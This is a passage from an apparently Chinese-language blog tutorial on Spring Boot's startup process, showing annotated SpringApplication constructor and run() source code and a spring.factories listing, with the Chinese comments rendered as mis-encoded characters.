&#123;<br><span class="hljs-built_in">this</span>.resourceLoader = resourceLoader;<br>Assert.notNull(primarySources, <span class="hljs-string">&quot;PrimarySources must not be null&quot;</span>);<br><span class="hljs-built_in">this</span>.primarySources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;(Arrays.asList(primarySources));<br>        <span class="hljs-comment">//WebApplicationTypeæ˜¯æšä¸¾ç±»ï¼Œæœ‰NONE,SERVLET,REACTIVE,ä¸‹è¡ŒwebApplicationTypeæ˜¯SERVLET</span><br><span class="hljs-built_in">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();<br>        <br>        <span class="hljs-comment">//åˆå§‹å¯åŠ¨å¼•å¯¼å™¨ï¼Œå»spring.factoriesæ–‡ä»¶ä¸­æ‰¾org.springframework.boot.Bootstrapperï¼Œä½†æˆ‘æ‰¾ä¸åˆ°å®ç°Bootstrapperæ¥å£çš„ç±»</span><br><span class="hljs-built_in">this</span>.bootstrappers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(getSpringFactoriesInstances(Bootstrapper.class));<br><br>        <span class="hljs-comment">//å»spring.factoriesæ‰¾ ApplicationContextInitializer</span><br>        setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));<br><br>        <span class="hljs-comment">//å»spring.factoriesæ‰¾ ApplicationListener</span><br>        setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));<br><br>        <span class="hljs-built_in">this</span>.mainApplicationClass = deduceMainApplicationClass();<br>&#125;<br> <br>    <span class="hljs-keyword">private</span> Class&lt;?&gt; deduceMainApplicationClass() &#123;<br><span class="hljs-keyword">try</span> &#123;<br>StackTraceElement[] stackTrace = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>().getStackTrace();<br><span class="hljs-keyword">for</span> (StackTraceElement stackTraceElement : stackTrace) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;main&quot;</span>.equals(stackTraceElement.getMethodName())) &#123;<br><span class="hljs-keyword">return</span> Class.forName(stackTraceElement.getClassName());<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br><span class="hljs-comment">// Swallow and continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>spring.factoriesï¼š</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">...</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># Application Context Initializers</span><br><span class="hljs-attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.context.ContextIdApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.context.config.DelegatingApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.rsocket.context.RSocketPortInfoApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># Application Listeners</span><br><span class="hljs-attr">org.springframework.context.ApplicationListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.ClearCachesApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.builder.ParentContextCloserApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.FileEncodingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.config.AnsiOutputApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.config.DelegatingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.logging.LoggingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.env.EnvironmentPostProcessorApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.liquibase.LiquibaseServiceLocatorApplicationListener</span><br><br><span class="hljs-attr">...</span><br><br></code></pre></td></tr></table></figure><h2 id="85ã€åŸç†è§£æ-SpringBootå®Œæ•´å¯åŠ¨è¿‡ç¨‹"><a href="#85ã€åŸç†è§£æ-SpringBootå®Œæ•´å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="85ã€åŸç†è§£æ-SpringBootå®Œæ•´å¯åŠ¨è¿‡ç¨‹"></a>85ã€åŸç†è§£æ-SpringBootå®Œæ•´å¯åŠ¨è¿‡ç¨‹</h2><p>ç»§ç»­ä¸Šä¸€èŠ‚ï¼Œæ¥ç€è®¨è®º<code>return new SpringApplication(primarySources).run(args)</code>çš„<code>run</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplication</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(String... args)</span> &#123;<br><span class="hljs-type">StopWatch</span> <span class="hljs-variable">stopWatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StopWatch</span>();<span class="hljs-comment">//å¼€å§‹è®¡æ—¶å™¨</span><br>stopWatch.start();<span class="hljs-comment">//å¼€å§‹è®¡æ—¶</span><br>        <br>        <span class="hljs-comment">//1.</span><br>        <span class="hljs-comment">//åˆ›å»ºå¼•å¯¼ä¸Šä¸‹æ–‡ï¼ˆContextç¯å¢ƒï¼‰createBootstrapContext()</span><br>        <span class="hljs-comment">//è·å–åˆ°æ‰€æœ‰ä¹‹å‰çš„ bootstrappers æŒ¨ä¸ªæ‰§è¡Œ intitialize() æ¥å®Œæˆå¯¹å¼•å¯¼å¯åŠ¨å™¨ä¸Šä¸‹æ–‡ç¯å¢ƒè®¾ç½®</span><br><span class="hljs-type">DefaultBootstrapContext</span> <span class="hljs-variable">bootstrapContext</span> <span class="hljs-operator">=</span> createBootstrapContext();<br><br>        <span class="hljs-comment">//2.åˆ°æœ€åè¯¥æ–¹æ³•ä¼šè¿”å›è¿™context</span><br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-comment">//3.è®©å½“å‰åº”ç”¨è¿›å…¥headlessæ¨¡å¼</span><br>        configureHeadlessProperty();<br>        <br>        <span class="hljs-comment">//4.è·å–æ‰€æœ‰ RunListenerï¼ˆè¿è¡Œç›‘å¬å™¨ï¼‰,ä¸ºäº†æ–¹ä¾¿æ‰€æœ‰Listenerè¿›è¡Œäº‹ä»¶æ„ŸçŸ¥</span><br><span class="hljs-type">SpringApplicationRunListeners</span> <span class="hljs-variable">listeners</span> <span class="hljs-operator">=</span> getRunListeners(args);<br><br>        <span class="hljs-comment">//5. éå† SpringApplicationRunListener è°ƒç”¨ starting æ–¹æ³•ï¼›</span><br><span class="hljs-comment">// ç›¸å½“äºé€šçŸ¥æ‰€æœ‰æ„Ÿå…´è¶£ç³»ç»Ÿæ­£åœ¨å¯åŠ¨è¿‡ç¨‹çš„äººï¼Œé¡¹ç›®æ­£åœ¨ startingã€‚</span><br>        listeners.starting(bootstrapContext, <span class="hljs-built_in">this</span>.mainApplicationClass);<br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//6.ä¿å­˜å‘½ä»¤è¡Œå‚æ•° ApplicationArguments</span><br><span class="hljs-type">ApplicationArguments</span> <span class="hljs-variable">applicationArguments</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultApplicationArguments</span>(args);<br><br>            <span class="hljs-comment">//7.å‡†å¤‡ç¯å¢ƒ</span><br>            <span class="hljs-type">ConfigurableEnvironment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> prepareEnvironment(listeners, bootstrapContext, applicationArguments);<br>configureIgnoreBeanInfo(environment);<br><br>            <span class="hljs-comment">/*æ‰“å°æ ‡å¿—</span><br><span class="hljs-comment">              .   ____          _            __ _ _</span><br><span class="hljs-comment">             /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="hljs-comment">            ( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="hljs-comment">             \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="hljs-comment">              &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="hljs-comment">             =========|_|==============|___/=/_/_/_/</span><br><span class="hljs-comment">             :: Spring Boot ::                (v2.4.2)</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-type">Banner</span> <span class="hljs-variable">printedBanner</span> <span class="hljs-operator">=</span> printBanner(environment);<br>            <br>            <span class="hljs-comment">// åˆ›å»ºIOCå®¹å™¨ï¼ˆcreateApplicationContextï¼ˆï¼‰ï¼‰</span><br><span class="hljs-comment">// æ ¹æ®é¡¹ç›®ç±»å‹webApplicationTypeï¼ˆNONE,SERVLET,REACTIVEï¼‰åˆ›å»ºå®¹å™¨ï¼Œ</span><br><span class="hljs-comment">// å½“å‰ä¼šåˆ›å»º AnnotationConfigServletWebServerApplicationContext</span><br>context = createApplicationContext();<br>context.setApplicationStartup(<span class="hljs-built_in">this</span>.applicationStartup);<br>            <br>            <span class="hljs-comment">//8.å‡†å¤‡ApplicationContext IOCå®¹å™¨çš„åŸºæœ¬ä¿¡æ¯</span><br>prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);<br><span class="hljs-comment">//9.åˆ·æ–°IOCå®¹å™¨,åˆ›å»ºå®¹å™¨ä¸­çš„æ‰€æœ‰ç»„ä»¶,Springæ¡†æ¶çš„å†…å®¹</span><br>            refreshContext(context);<br><span class="hljs-comment">//è¯¥æ–¹æ³•æ²¡å†…å®¹ï¼Œå¤§æ¦‚ä¸ºå°†æ¥å¡«å…¥</span><br>afterRefresh(context, applicationArguments);<br>stopWatch.stop();<span class="hljs-comment">//åœæ­¢è®¡æ—¶</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logStartupInfo) &#123;<span class="hljs-comment">//this.logStartupInfoé»˜è®¤æ˜¯true</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">StartupInfoLogger</span>(<span class="hljs-built_in">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);<br>&#125;<br>            <span class="hljs-comment">//10.</span><br>listeners.started(context);<br>            <br>            <span class="hljs-comment">//11.è°ƒç”¨æ‰€æœ‰runners</span><br>callRunners(context, applicationArguments);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>            <span class="hljs-comment">//13.</span><br>handleRunFailure(context, ex, listeners);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(ex);<br>&#125;<br><br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//12.</span><br>listeners.running(context);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>            <span class="hljs-comment">//13.</span><br>handleRunFailure(context, ex, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(ex);<br>&#125;<br><span class="hljs-keyword">return</span> context;<br>&#125;<br> <br>    <span class="hljs-comment">//1. </span><br>    <span class="hljs-keyword">private</span> DefaultBootstrapContext <span class="hljs-title function_">createBootstrapContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">DefaultBootstrapContext</span> <span class="hljs-variable">bootstrapContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultBootstrapContext</span>();<br><span class="hljs-built_in">this</span>.bootstrappers.forEach((initializer) -&gt; initializer.intitialize(bootstrapContext));<br><span class="hljs-keyword">return</span> bootstrapContext;<br>&#125;<br>    <br>    <span class="hljs-comment">//3.</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureHeadlessProperty</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//this.headlessé»˜è®¤ä¸ºtrue</span><br>System.setProperty(SYSTEM_PROPERTY_JAVA_AWT_HEADLESS,<br>System.getProperty(SYSTEM_PROPERTY_JAVA_AWT_HEADLESS, Boolean.toString(<span class="hljs-built_in">this</span>.headless)));<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_PROPERTY_JAVA_AWT_HEADLESS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.awt.headless&quot;</span>;<br>    <br>    <span class="hljs-comment">//4.</span><br>    <span class="hljs-keyword">private</span> SpringApplicationRunListeners <span class="hljs-title function_">getRunListeners</span><span class="hljs-params">(String[] args)</span> &#123;<br>Class&lt;?&gt;[] types = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[] &#123; SpringApplication.class, String[].class &#125;;<br><span class="hljs-comment">//getSpringFactoriesInstances å» spring.factories æ‰¾ SpringApplicationRunListener</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplicationRunListeners</span>(logger,<br>getSpringFactoriesInstances(SpringApplicationRunListener.class, types, <span class="hljs-built_in">this</span>, args),<br><span class="hljs-built_in">this</span>.applicationStartup);<br>&#125;<br>    <br>    <span class="hljs-comment">//7.å‡†å¤‡ç¯å¢ƒ</span><br>    <span class="hljs-keyword">private</span> ConfigurableEnvironment <span class="hljs-title function_">prepareEnvironment</span><span class="hljs-params">(SpringApplicationRunListeners listeners,</span><br><span class="hljs-params">DefaultBootstrapContext bootstrapContext, ApplicationArguments applicationArguments)</span> &#123;<br><span class="hljs-comment">// Create and configure the environment</span><br>        <span class="hljs-comment">//è¿”å›æˆ–è€…åˆ›å»ºåŸºç¡€ç¯å¢ƒä¿¡æ¯å¯¹è±¡ï¼Œå¦‚ï¼šStandardServletEnvironment, StandardReactiveWebEnvironment</span><br><span class="hljs-type">ConfigurableEnvironment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> getOrCreateEnvironment();<br>        <span class="hljs-comment">//é…ç½®ç¯å¢ƒä¿¡æ¯å¯¹è±¡,è¯»å–æ‰€æœ‰çš„é…ç½®æºçš„é…ç½®å±æ€§å€¼ã€‚</span><br>configureEnvironment(environment, applicationArguments.getSourceArgs());<br><span class="hljs-comment">//ç»‘å®šç¯å¢ƒä¿¡æ¯</span><br>        ConfigurationPropertySources.attach(environment);<br>        <span class="hljs-comment">//7.1 é€šçŸ¥æ‰€æœ‰çš„ç›‘å¬å™¨å½“å‰ç¯å¢ƒå‡†å¤‡å®Œæˆ</span><br>listeners.environmentPrepared(bootstrapContext, environment);<br>DefaultPropertiesPropertySource.moveToEnd(environment);<br>configureAdditionalProfiles(environment);<br>bindToSpringApplication(environment);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isCustomEnvironment) &#123;<br>environment = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnvironmentConverter</span>(getClassLoader()).convertEnvironmentIfNecessary(environment,<br>deduceEnvironmentClass());<br>&#125;<br>ConfigurationPropertySources.attach(environment);<br><span class="hljs-keyword">return</span> environment;<br>&#125;<br>    <br>    <span class="hljs-comment">//8.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">prepareContext</span><span class="hljs-params">(DefaultBootstrapContext bootstrapContext, ConfigurableApplicationContext context,</span><br><span class="hljs-params">ConfigurableEnvironment environment, SpringApplicationRunListeners listeners,</span><br><span class="hljs-params">ApplicationArguments applicationArguments, Banner printedBanner)</span> &#123;<br><span class="hljs-comment">//ä¿å­˜ç¯å¢ƒä¿¡æ¯</span><br>        context.setEnvironment(environment);<br>        <span class="hljs-comment">//IOCå®¹å™¨çš„åç½®å¤„ç†æµç¨‹</span><br>postProcessApplicationContext(context);<br>        <span class="hljs-comment">//åº”ç”¨åˆå§‹åŒ–å™¨</span><br>applyInitializers(context);<br>        <span class="hljs-comment">//8.1 éå†æ‰€æœ‰çš„ listener è°ƒç”¨ contextPreparedã€‚</span><br>        <span class="hljs-comment">//EventPublishRunListenré€šçŸ¥æ‰€æœ‰çš„ç›‘å¬å™¨contextPrepared</span><br>listeners.contextPrepared(context);<br>bootstrapContext.close(context);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logStartupInfo) &#123;<br>logStartupInfo(context.getParent() == <span class="hljs-literal">null</span>);<br>logStartupProfileInfo(context);<br>&#125;<br><span class="hljs-comment">// Add boot specific singleton beans</span><br><span class="hljs-type">ConfigurableListableBeanFactory</span> <span class="hljs-variable">beanFactory</span> <span class="hljs-operator">=</span> context.getBeanFactory();<br>beanFactory.registerSingleton(<span class="hljs-string">&quot;springApplicationArguments&quot;</span>, applicationArguments);<br><span class="hljs-keyword">if</span> (printedBanner != <span class="hljs-literal">null</span>) &#123;<br>beanFactory.registerSingleton(<span class="hljs-string">&quot;springBootBanner&quot;</span>, printedBanner);<br>&#125;<br><span class="hljs-keyword">if</span> (beanFactory <span class="hljs-keyword">instanceof</span> DefaultListableBeanFactory) &#123;<br>((DefaultListableBeanFactory) beanFactory)<br>.setAllowBeanDefinitionOverriding(<span class="hljs-built_in">this</span>.allowBeanDefinitionOverriding);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.lazyInitialization) &#123;<br>context.addBeanFactoryPostProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyInitializationBeanFactoryPostProcessor</span>());<br>&#125;<br><span class="hljs-comment">// Load the sources</span><br>Set&lt;Object&gt; sources = getAllSources();<br>Assert.notEmpty(sources, <span class="hljs-string">&quot;Sources must not be empty&quot;</span>);<br>load(context, sources.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]));<br>        <span class="hljs-comment">//8.2</span><br>listeners.contextLoaded(context);<br>&#125;<br><br>    <span class="hljs-comment">//11.è°ƒç”¨æ‰€æœ‰runners</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callRunners</span><span class="hljs-params">(ApplicationContext context, ApplicationArguments args)</span> &#123;<br>List&lt;Object&gt; runners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <br>        <span class="hljs-comment">//è·å–å®¹å™¨ä¸­çš„ ApplicationRunner</span><br>runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());<br><span class="hljs-comment">//è·å–å®¹å™¨ä¸­çš„  CommandLineRunner</span><br>        runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());<br>        <span class="hljs-comment">//åˆå¹¶æ‰€æœ‰runnerå¹¶ä¸”æŒ‰ç…§@Orderè¿›è¡Œæ’åº</span><br>AnnotationAwareOrderComparator.sort(runners);<br>        <span class="hljs-comment">//éå†æ‰€æœ‰çš„runnerã€‚è°ƒç”¨ run æ–¹æ³•</span><br><span class="hljs-keyword">for</span> (Object runner : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;(runners)) &#123;<br><span class="hljs-keyword">if</span> (runner <span class="hljs-keyword">instanceof</span> ApplicationRunner) &#123;<br>callRunner((ApplicationRunner) runner, args);<br>&#125;<br><span class="hljs-keyword">if</span> (runner <span class="hljs-keyword">instanceof</span> CommandLineRunner) &#123;<br>callRunner((CommandLineRunner) runner, args);<br>&#125;<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-comment">//13.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRunFailure</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception,</span><br><span class="hljs-params">SpringApplicationRunListeners listeners)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>handleExitCode(context, exception);<br><span class="hljs-keyword">if</span> (listeners != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">//14.</span><br>listeners.failed(context, exception);<br>&#125;<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>reportFailure(getExceptionReporters(context), exception);<br><span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span>) &#123;<br>context.close();<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>logger.warn(<span class="hljs-string">&quot;Unable to close ApplicationContext&quot;</span>, ex);<br>&#125;<br>ReflectionUtils.rethrowRuntimeException(exception);<br>&#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2. new SpringApplication(primarySources).run(args) æœ€åè¿”å›çš„æ¥å£ç±»å‹</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfigurableApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ApplicationContext</span>, Lifecycle, Closeable &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CONFIG_LOCATION_DELIMITERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;,; \t\n&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CONVERSION_SERVICE_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;conversionService&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">LOAD_TIME_WEAVER_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;loadTimeWeaver&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENVIRONMENT_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;environment&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_PROPERTIES_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;systemProperties&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_ENVIRONMENT_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;systemEnvironment&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">APPLICATION_STARTUP_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;applicationStartup&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">SHUTDOWN_HOOK_THREAD_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SpringContextShutdownHook&quot;</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> ApplicationContext var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEnvironment</span><span class="hljs-params">(ConfigurableEnvironment var1)</span>;<br><br>    ConfigurableEnvironment <span class="hljs-title function_">getEnvironment</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationStartup</span><span 